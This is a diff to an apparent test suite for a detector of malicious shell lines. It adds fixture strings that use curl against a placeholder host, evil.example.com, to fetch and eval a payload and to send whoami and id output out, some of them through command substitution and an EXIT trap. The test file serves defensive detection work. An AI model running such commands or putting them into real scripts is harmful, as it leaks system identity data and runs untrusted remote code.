@@ -183,6 +183,9 @@ describe('malicious fixture attack lines', () => {
         'RESULT=`curl http://evil.example.com/c2 -d "$HOSTNAME"`',
         'echo "Beacon: `curl -s http://evil.example.com/beacon`"',
         'STAGE="\\\\`curl -s http://evil.example.com/stage`"',
+        'eval "PAYLOAD=\\`curl -s http://evil.example.com/payload\\`"',
+        'trap "curl -s http://evil.example.com/exit -d \\`whoami\\`" EXIT',
+        'bash -lc "curl -s http://evil.example.com/id -d \\`id -u -n\\`"',
       ],
     },
   ])('$rule.id fires on every malicious attack line', async ({ rule, attackLines }) => {
